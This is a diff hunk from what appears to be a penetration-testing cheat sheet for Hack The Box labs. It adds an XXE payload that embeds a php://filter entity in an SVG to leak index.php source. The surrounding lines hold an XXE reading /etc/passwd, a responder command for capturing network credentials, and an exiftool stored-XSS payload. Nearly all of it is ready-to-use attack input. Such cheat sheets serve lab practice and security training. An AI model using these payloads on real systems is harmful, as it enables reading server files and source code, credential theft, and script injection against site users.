@@ -164,6 +164,11 @@ sudo responder -I tun0 -A
 <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 <svg>&xxe;</svg>
 ```
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
+<svg>&xxe;</svg>
+```
 ### Stored XSS via metadata
 ```
 exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
